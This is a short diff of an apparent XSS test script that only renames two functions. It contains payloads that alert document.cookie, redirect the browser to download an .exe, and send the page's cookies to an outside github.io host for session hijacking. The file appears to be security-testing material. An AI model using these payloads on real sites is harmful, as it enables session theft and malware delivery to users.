@@ -1,10 +1,10 @@
 alert("XSS TEST");
 alert(document.cookie);
 
-function malware_download(){
+function MALWARE_DOWNLOAD(){
   document.location.href="https://ninzacode.github.io/SECURITY_TEST/sample.exe";
 }
 
-function session_hijacking(){
+function SESSION_HIJACKING(){
   window.open("https://ninzacode.github.io/SECURITY_TEST/XSS.html?cookie="+encodeURIComponent(document.cookie), target="_blank");
 }
